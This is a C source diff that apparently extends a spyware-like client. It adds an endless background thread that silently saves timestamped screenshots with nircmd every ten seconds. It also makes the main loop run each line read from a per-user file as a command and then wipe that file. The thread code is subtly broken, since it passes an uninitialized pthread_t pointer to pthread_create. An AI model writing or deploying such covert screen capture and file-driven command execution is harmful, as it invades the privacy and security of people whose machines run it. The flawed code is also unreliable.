@@ -5,8 +5,23 @@
 #include "coder.h"
 #include "emptyFileCheck.h"
 #include "Execute.h"
+#include <pthread.h>
+
+
+void *func1() {
+    while (1)
+    {
+        Nircmd("nircmd savescreenshot ~$currdate.MM_dd_yyyy$-~$currtime.HH_mm_ss$.png");
+        Sleep(10000);
+    }
+    
+}
 
 void main() {
+
+
+    pthread_t *th1;
+    pthread_create(th1,NULL,func1, NULL);
 
     char *combined_username = makeUsername();
 
@@ -53,6 +68,11 @@ void main() {
             //cipher(line, 1);
 
             Execute(line);
+
+            fclose(user_specific_file);
+            user_specific_file = fopen(filename, "w");
+            fclose(user_specific_file);
+
             
         }
 
